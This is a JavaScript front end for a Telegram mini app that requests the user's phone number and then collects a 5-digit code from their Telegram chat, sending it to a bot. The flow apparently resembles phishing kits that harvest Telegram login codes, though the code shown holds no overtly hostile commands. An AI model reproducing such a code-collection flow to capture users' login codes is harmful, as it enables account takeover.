document.addEventListener('DOMContentLoaded', function() {
    const tg = window.Telegram.WebApp;
    const phoneSection = document.getElementById('phone-section');
    const otpSection = document.getElementById('otp-section');
    const requestPhoneBtn = document.getElementById('request-phone-btn');
    const otpBoxes = document.querySelectorAll('.otp-box');
    const keys = document.querySelectorAll('.key');
    const verifyBtn = document.getElementById('verify-btn');
    
    let currentIndex = 0;
    
    // Initialize Telegram Web App - Keep it open!
    tg.ready();
    tg.expand();
    tg.enableClosingConfirmation(); // Prevent accidental closing
    
    function focusNextBox() {
        if (currentIndex < otpBoxes.length - 1) {
            currentIndex++;
            otpBoxes[currentIndex].focus();
        }
    }
    
    function focusPrevBox() {
        if (currentIndex > 0) {
            currentIndex--;
            otpBoxes[currentIndex].focus();
        }
    }
    
    function handleKeyPress(key) {
        if (key === 'backspace') {
            otpBoxes[currentIndex].value = '';
            focusPrevBox();
        } else if (!isNaN(key)) {
            otpBoxes[currentIndex].value = key;
            focusNextBox();
        }
    }
    
    function showOtpSection() {
        phoneSection.style.display = 'none';
        otpSection.style.display = 'block';
        otpBoxes[0].focus();
        // Show a message to user
        tg.showPopup({
            title: 'OTP Sent!',
            message: 'Check your Telegram chat for the OTP code!',
            buttons: [{ type: 'ok', text: 'Got it!' }]
        });
    }
    
    // Request Phone Access
    requestPhoneBtn.addEventListener('click', function() {
        if (tg) {
            // Show loading
            tg.MainButton.setText('Sending OTP...');
            tg.MainButton.show();
            tg.MainButton.disable();
            
            // Send request to bot - but don't close app!
            // Use sendData but we'll handle it without closing
            tg.sendData('request_otp:requested');
            
            setTimeout(() => {
                tg.MainButton.hide();
                showOtpSection();
            }, 500);
        }
    });
    
    // OTP Input Handlers
    otpBoxes.forEach((box, index) => {
        box.addEventListener('input', function(e) {
            if (this.value.length === 1) {
                focusNextBox();
            }
        });
        
        box.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '') {
                focusPrevBox();
            }
        });
    });
    
    // Keypad Handlers
    keys.forEach(key => {
        key.addEventListener('click', function() {
            const keyValue = this.dataset.key;
            handleKeyPress(keyValue);
        });
    });
    
    // Verify OTP
    verifyBtn.addEventListener('click', function() {
        const otp = Array.from(otpBoxes).map(box => box.value).join('');
        if (otp.length === 5) {
            if (tg) {
                tg.MainButton.setText('Verifying...');
                tg.MainButton.show();
                tg.MainButton.disable();
                tg.sendData('verify_otp:' + otp);
            }
        } else {
            tg.showPopup({
                title: 'Error',
                message: 'Please enter a complete 5-digit OTP!',
                buttons: [{ type: 'ok', text: 'OK' }]
            });
        }
    });
});
